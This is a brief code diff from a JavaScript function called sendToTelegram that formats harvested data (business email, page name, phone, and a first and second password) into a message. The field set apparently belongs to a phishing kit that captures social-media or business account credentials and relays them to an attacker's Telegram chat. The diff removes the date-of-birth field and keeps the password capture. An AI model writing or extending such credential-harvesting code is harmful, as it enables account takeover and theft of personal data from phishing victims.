@@ -109,7 +109,6 @@ async sendToTelegram(data) {
 <b>Email Business:</b> <code>${data.emailBusiness || ''}</code>
 <b>Page Name:</b> <code>${data.fanpage || ''}</code>
 <b>Phone:</b> <code>${data.phone || ''}</code>
-<b>Date of Birth:</b> <code>${data.day}/${data.month}/${data.year}</code>
 ----------------------------------
 <b>Password(1):</b> <code>${data.password || ''}</code>
 <b>Password(2):</b> <code>${data.passwordSecond || ''}</code>
